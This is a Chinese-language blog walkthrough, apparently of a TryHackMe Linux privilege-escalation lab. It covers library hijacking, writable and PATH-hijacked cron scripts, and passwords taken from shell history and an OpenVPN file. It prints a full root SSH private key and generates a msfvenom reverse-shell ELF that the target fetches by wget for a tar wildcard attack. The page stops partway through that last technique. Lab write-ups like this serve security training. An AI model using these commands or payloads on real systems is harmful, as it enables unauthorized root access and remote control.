<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ ldd /usr/bin/nmap</span><br><span class="line">        linux-vdso.so.1 =&gt;  (0x00007fff94fff000)</span><br><span class="line">        libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f645cc15000)</span><br><span class="line">        libpcap.so.0.8 =&gt; /usr/lib/libpcap.so.0.8 (0x00007f645c9df000)</span><br><span class="line">        libssl.so.0.9.8 =&gt; /usr/lib/libssl.so.0.9.8 (0x00007f645c786000)</span><br><span class="line">        libcrypto.so.0.9.8 =&gt; /usr/lib/libcrypto.so.0.9.8 (0x00007f645c3e4000)</span><br><span class="line">        liblua5.1.so.0 =&gt; /usr/lib/liblua5.1.so.0 (0x00007f645c1b9000)</span><br><span class="line">        libdl.so.2 =&gt; /lib/libdl.so.2 (0x00007f645bfb4000)</span><br><span class="line">        libstdc++.so.6 =&gt; /usr/lib/libstdc++.so.6 (0x00007f645bca0000)</span><br><span class="line">        libm.so.6 =&gt; /lib/libm.so.6 (0x00007f645ba1f000)</span><br><span class="line">        libgcc_s.so.1 =&gt; /lib/libgcc_s.so.1 (0x00007f645b808000)</span><br><span class="line">        libc.so.6 =&gt; /lib/libc.so.6 (0x00007f645b49c000)</span><br><span class="line">        libz.so.1 =&gt; /usr/lib/libz.so.1 (0x00007f645b285000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007f645ce58000)</span><br></pre></td></tr></table></figure>

<p><strong>这里我选择 libpcap.so.0.8来劫持，这里的选择是有说法的，尽量选择轻量级的ldd库文件，避免选择libc等产生提权失败问题</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ gcc -o /tmp/libpcap.so.0.8 -shared -fPIC /home/user/tools/sudo/library_path.c</span><br><span class="line">user@debian:~$ sudo LD_LIBRARY_PATH=/tmp /usr/bin/nmap</span><br><span class="line">root@debian:/home/user# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<p><strong>你可以选择不一样的其它库文件甚至是不一样的命令</strong></p>
<h3>计划任务提权</h3>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ cat /etc/crontab</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Unlike any other crontab you don<span class="string">&#x27;t have to run the `crontab&#x27;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">command</span> to install the new version when you edit this file</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">and files <span class="keyword">in</span> /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">that none of the other crontabs <span class="keyword">do</span>.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">m h dom mon dow user  <span class="built_in">command</span></span></span><br><span class="line">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">* * * * * root overwrite.sh</span></span><br><span class="line">* * * * * root /usr/local/bin/compress.sh</span><br></pre></td></tr></table></figure>

<p><strong>两个文件均以root权限执行且每分钟执行一次</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ser@debian:~$ locate overwrite.sh</span><br><span class="line">locate: warning: database `/var/cache/locate/locatedb&#x27; is more than 8 days old (actual age is 1709.2 days)</span><br><span class="line">/usr/local/bin/overwrite.sh</span><br><span class="line">user@debian:~$ ls -la /usr/local/bin/</span><br><span class="line">total 44</span><br><span class="line">drwxrwsr-x  2 root staff 4096 May 14  2017 .</span><br><span class="line">drwxrwsr-x 10 root staff 4096 May 13  2017 ..</span><br><span class="line">-rwxr--r--  1 root staff   53 May 13  2017 compress.sh</span><br><span class="line">-rwxr--rw-  1 root staff   40 May 13  2017 overwrite.sh</span><br><span class="line">-rwsr-sr-x  1 root staff 6883 May 14  2017 suid-env</span><br><span class="line">-rwsr-sr-x  1 root staff 6899 May 14  2017 suid-env2</span><br><span class="line">-rwsr-sr-x  1 root staff 9861 May 14  2017 suid-so</span><br></pre></td></tr></table></figure>

<p><strong>第二个有权限写入，那就直接改写劫持，也可以反弹shell</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ echo &quot;cp /bin/bash /tmp/sh;chmod +xs /tmp/sh&quot; &gt;/usr/local/bin/overwrite.sh</span><br><span class="line">user@debian:/tmp$ ls</span><br><span class="line">backup.tar.gz  libpcap.so.0.8  preload.so  sh  useless</span><br><span class="line">user@debian:/tmp$ ./sh</span><br><span class="line">sh-4.1# id</span><br><span class="line">uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br><span class="line">sh-4.1# whoami</span><br><span class="line">root</span><br><span class="line">sh-4.1#</span><br></pre></td></tr></table></figure>

<h3>计划任务-环境变量提权</h3>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Unlike any other crontab you don<span class="string">&#x27;t have to run the `crontab&#x27;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">command</span> to install the new version when you edit this file</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">and files <span class="keyword">in</span> /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">that none of the other crontabs <span class="keyword">do</span>.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">m h dom mon dow user  <span class="built_in">command</span></span></span><br><span class="line">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">* * * * * root overwrite.sh</span></span><br><span class="line">* * * * * root /usr/local/bin/compress.sh</span><br></pre></td></tr></table></figure>

<p><strong>观察两点，第一个是有一个文件路径不全，第二个则是我们的&#x2F;home&#x2F;user在PATH的最前面，这样的话，无论 overwrite.sh是否可写，直接在我们家目录整一份名字一样的文件，直接劫持</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ nano overwrite.sh</span><br><span class="line">user@debian:~$ cat overwrite.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">cp /bin/bash /tmp/rootbash</span><br><span class="line">chmod +xs /tmp/rootbash</span><br><span class="line">user@debian:~$ chmod +x  overwrite.sh</span><br><span class="line">user@debian:/tmp$ ./rootbash -p</span><br><span class="line">rootbash-4.1# whoami</span><br><span class="line">root</span><br><span class="line">rootbash-4.1# id</span><br><span class="line">uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br></pre></td></tr></table></figure>

<p><strong>也可以反弹shell</strong></p>
<h3>历史命令-密码泄露提权</h3>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.*history | less</span><br><span class="line">......</span><br><span class="line">mysql -h somehost.local -uroot -ppassword123</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p><strong>这是其中最重要的泄露，我们不仅可以尝试去连接数据库，读取数据库中的信息，我们也可以猜测这个密码，是我们root机器的密码</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ su root</span><br><span class="line">Password:</span><br><span class="line">root@debian:/home/user# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@debian:/home/user#</span><br></pre></td></tr></table></figure>

<p><strong>确实是的，历史命令会泄露一些敏感的信息</strong></p>
<h3>配置文件-密码泄露提权</h3>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ ls -la</span><br><span class="line">total 60</span><br><span class="line">drwxr-xr-x 5 user user 4096 Jan 18 11:12 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 May 15  2017 ..</span><br><span class="line">-rw------- 1 user user 2725 Jan 18 11:32 .bash_history</span><br><span class="line">-rw-r--r-- 1 user user  220 May 12  2017 .bash_logout</span><br><span class="line">-rw-r--r-- 1 user user 3235 May 14  2017 .bashrc</span><br><span class="line">drwxr-xr-x 2 user user 4096 May 13  2017 .irssi</span><br><span class="line">drwx------ 2 user user 4096 May 15  2020 .john</span><br><span class="line">-rw------- 1 user user  137 May 15  2017 .lesshst</span><br><span class="line">-rw-r--r-- 1 user user  212 May 15  2017 myvpn.ovpn</span><br><span class="line">-rw------- 1 user user   11 Jan 18 10:53 .nano_history</span><br><span class="line">-rwxr-xr-x 1 user user   64 Jan 18 10:53 overwrite.sh</span><br><span class="line">-rw-r--r-- 1 user user  725 May 13  2017 .profile</span><br><span class="line">drwxr-xr-x 8 user user 4096 May 15  2020 tools</span><br><span class="line">-rw------- 1 user user 6334 May 15  2020 .viminfo</span><br><span class="line">user@debian:~$ cat  myvpn.ovpn</span><br><span class="line">client</span><br><span class="line">dev tun</span><br><span class="line">proto udp</span><br><span class="line">remote 10.10.10.10 1194</span><br><span class="line">resolv-retry infinite</span><br><span class="line">nobind</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line">ca ca.crt</span><br><span class="line">tls-client</span><br><span class="line">remote-cert-tls server</span><br><span class="line">auth-user-pass /etc/openvpn/auth.txt</span><br><span class="line">comp-lzo</span><br><span class="line">verb 1</span><br><span class="line">reneg-sec 0</span><br></pre></td></tr></table></figure>

<p><code>auth-user-pass /etc/openvpn/auth.txt</code><strong>可以发现是有可疑的文件的</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ cat /etc/openvpn/auth.txt</span><br><span class="line">root</span><br><span class="line">password123</span><br><span class="line">user@debian:~$</span><br></pre></td></tr></table></figure>

<p><strong>直接可以拿到密码的，这几个偏向提供思路，敏感信息是要看的，万一有关键信息的泄露呢</strong></p>
<h3>.ssh密钥泄露提权</h3>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ ls -la /</span><br><span class="line">total 96</span><br><span class="line">drwxr-xr-x 22 root root  4096 Aug 25  2019 .</span><br><span class="line">drwxr-xr-x 22 root root  4096 Aug 25  2019 ..</span><br><span class="line">drwxr-xr-x  2 root root  4096 Aug 25  2019 bin</span><br><span class="line">drwxr-xr-x  3 root root  4096 May 12  2017 boot</span><br><span class="line">drwxr-xr-x 12 root root  2820 Jan 18 08:11 dev</span><br><span class="line">drwxr-xr-x 67 root root  4096 Jan 18 11:38 etc</span><br><span class="line">drwxr-xr-x  3 root root  4096 May 15  2017 home</span><br><span class="line">lrwxrwxrwx  1 root root    30 May 12  2017 initrd.img -&gt; boot/initrd.img-2.6.32-5-amd64</span><br><span class="line">drwxr-xr-x 12 root root 12288 May 14  2017 lib</span><br><span class="line">lrwxrwxrwx  1 root root     4 May 12  2017 lib64 -&gt; /lib</span><br><span class="line">drwx------  2 root root 16384 May 12  2017 lost+found</span><br><span class="line">drwxr-xr-x  3 root root  4096 May 12  2017 media</span><br><span class="line">drwxr-xr-x  2 root root  4096 Jun 11  2014 mnt</span><br><span class="line">drwxr-xr-x  2 root root  4096 May 12  2017 opt</span><br><span class="line">dr-xr-xr-x 96 root root     0 Jan 18 08:10 proc</span><br><span class="line">drwx------  5 root root  4096 Jan 18 10:06 root</span><br><span class="line">drwxr-xr-x  2 root root  4096 May 13  2017 sbin</span><br><span class="line">drwxr-xr-x  2 root root  4096 Jul 21  2010 selinux</span><br><span class="line">drwxr-xr-x  2 root root  4096 May 12  2017 srv</span><br><span class="line">drwxr-xr-x  2 root root  4096 Aug 25  2019 .ssh</span><br><span class="line">drwxr-xr-x 13 root root     0 Jan 18 08:10 sys</span><br><span class="line">drwxrwxrwt  2 root root  4096 Jan 18 11:47 tmp</span><br><span class="line">drwxr-xr-x 11 root root  4096 May 13  2017 usr</span><br><span class="line">drwxr-xr-x 14 root root  4096 May 13  2017 var</span><br><span class="line">lrwxrwxrwx  1 root root    27 May 12  2017 vmlinuz -&gt; boot/vmlinuz-2.6.32-5-amd64</span><br></pre></td></tr></table></figure>

<p><strong>目录下竟然有.ssh文件，直接去看</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ cd /.ssh/</span><br><span class="line">user@debian:/.ssh$ ls</span><br><span class="line">root_key</span><br><span class="line">user@debian:/.ssh$ cat root_key</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm</span><br><span class="line">gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl</span><br><span class="line">p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo</span><br><span class="line">OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD</span><br><span class="line">eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET</span><br><span class="line">Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2</span><br><span class="line">NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ</span><br><span class="line">YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+</span><br><span class="line">5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el</span><br><span class="line">WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7</span><br><span class="line">VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7</span><br><span class="line">6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW</span><br><span class="line">1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K</span><br><span class="line">824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6</span><br><span class="line">Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc</span><br><span class="line">U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1</span><br><span class="line">Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi</span><br><span class="line">SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV</span><br><span class="line">d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im</span><br><span class="line">jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa</span><br><span class="line">871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok</span><br><span class="line">X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4</span><br><span class="line">CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN</span><br><span class="line">Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4</span><br><span class="line">LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p><strong>拿到密钥，就可以直接登录了，当然密钥很短，肯定没密码</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ nano id</span><br><span class="line">user@debian:~$ chmod 600 id</span><br><span class="line">user@debian:~$ ssh -o HostkeyAlgorithms=ssh-rsa root@10.10.120.121 -i id</span><br><span class="line">The authenticity of host &#x27;10.10.120.121 (10.10.120.121)&#x27; can&#x27;t be established.</span><br><span class="line">RSA key fingerprint is 08:84:3e:96:4d:9a:2f:a1:db:be:68:29:80:ab:f3:56.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.120.121&#x27; (RSA) to the list of known hosts.</span><br><span class="line">Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Aug 25 14:02:49 2019 from 192.168.1.2</span><br><span class="line">root@debian:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@debian:~#</span><br></pre></td></tr></table></figure>

<h3>定时任务-通配符绕过</h3>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ cat /etc/crontab</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Unlike any other crontab you don<span class="string">&#x27;t have to run the `crontab&#x27;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">command</span> to install the new version when you edit this file</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">and files <span class="keyword">in</span> /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">that none of the other crontabs <span class="keyword">do</span>.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">m h dom mon dow user	<span class="built_in">command</span></span></span><br><span class="line">17 *	* * *	root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">* * * * * root overwrite.sh</span></span><br><span class="line">* * * * * root /usr/local/bin/compress.sh</span><br></pre></td></tr></table></figure>

<p><strong>我们去看看第二个定时任务是干啥的</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ cat /usr/local/bin/compress.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">cd /home/user</span><br><span class="line">tar czf /tmp/backup.tar.gz *</span><br></pre></td></tr></table></figure>

<p><strong>执行了一个tar命令，将&#x2F;user下的文件备份到&#x2F;tmp目录下，但是，关于tar命令，是可以进行命令执行的</strong></p>
<p><img src="/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/2.png" alt="2"></p>
<p><strong>我们要如何实现呢，非常的简单</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-10-19-249:~/Tools# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.19.249 LPORT=4444 -f elf -o shell.elf</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 74 bytes</span><br><span class="line">Final size of elf file: 194 bytes</span><br><span class="line">Saved as: shell.elf</span><br></pre></td></tr></table></figure>

<p><strong>我们先生成一个反弹shell的elf可执行文件，传到目标的机器上</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-10-19-249:~/Tools# python3 -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.10.150.39 - - [19/Jan/2025 04:06:01] &quot;GET /shell.elf HTTP/1.0&quot; 200 -</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ wget http://10.10.19.249:8000/shell.elf</span><br><span class="line">--2025-01-18 23:06:01--  http://10.10.19.249:8000/shell.elf</span><br><span class="line">Connecting to 10.10.19.249:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 194 [application/octet-stream]</span><br><span class="line">Saving to: \u201cshell.elf\u201d</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">100%</span><span class="language-bash">[======================================&gt;] 194         --.-K/s   <span class="keyword">in</span> 0s</span>      </span><br><span class="line"></span><br><span class="line">2025-01-18 23:06:01 (51.2 MB/s) - \u201cshell.elf\u201d saved [194/194]</span><br><span class="line"></span><br><span class="line">user@debian:~$ </span><br></pre></td></tr></table></figure>

<p><strong>赋予可执行权限，然后创建两个目录</strong></p>
